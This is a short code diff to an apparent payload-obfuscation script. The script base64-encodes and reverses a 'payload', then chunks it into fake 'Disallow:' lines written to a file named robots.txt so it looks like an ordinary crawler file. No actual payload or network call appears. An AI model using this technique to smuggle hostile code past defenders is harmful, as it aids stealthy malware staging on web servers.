@@ -13,10 +13,10 @@ def addToken(blob,token,min=3,max=15):
   while len(line) > 5:
     offset = random.randrange(min,max)
     if offset < len(line):
-      out = out + "%s%s"%(line[:offset],token)
+      out = out + "Disallow: /" + "%s%s"%(line[:offset],token)
       line = line[offset:]
     else:
-      out = out + "%s"%line
+      out = out + "Disallow: /" + "%s"%line
       line = ""
   return(out)
 
@@ -41,5 +41,5 @@ if __name__ == '__main__':
   print("Reversed full payload")
   print("Added random newlines and '.html' extensions")
   b64cOUT = addToken(b64cR,".html\n")
-  with open('%s.Lorum'%sys.argv[1], 'w') as the_file:
-    the_file.write("Disallow: /" + b64cOUT + ".html\n")    
+  with open('%s.robots.txt'%sys.argv[1], 'w') as the_file:
+    the_file.write(b64cOUT + ".html\n")
